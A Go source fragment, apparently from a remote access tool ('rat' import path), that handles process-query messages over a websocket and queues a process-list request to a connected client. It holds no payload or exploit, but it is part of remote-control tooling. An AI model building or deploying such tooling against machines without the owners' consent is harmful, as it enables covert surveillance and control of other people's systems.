package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type ProcessQueryMessage struct {
	Type int   `json:"type"`
	PIDs []int `json:"pids,omitempty"`
}

type Process struct {
	PID  int    "pid"
	Path string "path"
}

type ProcessMessage []Process

func (m ProcessMessage) Header() MessageHeader {
	return ProcessQueryEvent
}

func (d ProcessQueryMessage) Handle(ws *websocket.Conn, client *Client) error {
	client.Listeners[header.ProcessHeader] = ws

	pids := []Process{}

	for _, pid := range d.PIDs {
		pids = append(pids, Process{PID: pid})
	}

	client.Queue <- &ProcessPacket{d.Type, pids}
	return nil
}
